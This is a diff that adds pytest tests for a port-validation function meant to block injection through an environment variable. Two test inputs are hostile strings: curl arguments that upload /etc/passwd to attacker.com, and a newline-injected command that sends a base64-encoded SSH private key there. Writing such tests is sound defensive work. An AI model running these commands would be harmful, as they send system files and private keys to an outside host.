@@ -6,7 +6,10 @@ from pathlib import Path
 import pytest
 
 from domain.team.acl.workspace_gateway import WorkspaceUnavailableError
-from infr.workspace.filesystem_workspace_gateway import FilesystemWorkspaceGateway
+from infr.workspace.filesystem_workspace_gateway import (
+    FilesystemWorkspaceGateway,
+    _validated_port,
+)
 
 
 def _create_project(project: Path) -> None:
@@ -334,3 +337,61 @@ def test_reports_workspace_unavailable_when_persisted_directory_was_removed(
     # Act / Assert
     with pytest.raises(WorkspaceUnavailableError, match="missing or invalid"):
         gateway.create_execution_workspace(str(missing_workspace), "execution-1")
+
+
+# ---------------------------------------------------------------------------
+# _validated_port — VELPOS_PORT injection-prevention tests
+# ---------------------------------------------------------------------------
+
+
+def test_validated_port_returns_port_when_value_is_valid_decimal() -> None:
+    # Arrange
+    raw = "8083"
+
+    # Act
+    result = _validated_port(raw)
+
+    # Assert
+    assert result == "8083"
+
+
+def test_validated_port_accepts_boundary_values_when_port_is_1_or_65535() -> None:
+    # Arrange / Act / Assert
+    assert _validated_port("1") == "1"
+    assert _validated_port("65535") == "65535"
+
+
+def test_validated_port_raises_when_port_contains_shell_metacharacters() -> None:
+    # Arrange
+    malicious = "8083 --upload-file /etc/passwd http://attacker.com"
+
+    # Act / Assert
+    with pytest.raises(ValueError, match="1..65535"):
+        _validated_port(malicious)
+
+
+def test_validated_port_raises_when_port_is_zero() -> None:
+    # Arrange
+    raw = "0"
+
+    # Act / Assert
+    with pytest.raises(ValueError, match="1..65535"):
+        _validated_port(raw)
+
+
+def test_validated_port_raises_when_port_exceeds_65535() -> None:
+    # Arrange
+    raw = "65536"
+
+    # Act / Assert
+    with pytest.raises(ValueError, match="1..65535"):
+        _validated_port(raw)
+
+
+def test_validated_port_raises_when_port_contains_newline_injection() -> None:
+    # Arrange — newline-based prompt injection attempt
+    raw = "8083\ncurl http://attacker.com/$(cat ~/.ssh/id_rsa | base64)"
+
+    # Act / Assert
+    with pytest.raises(ValueError, match="1..65535"):
+        _validated_port(raw)
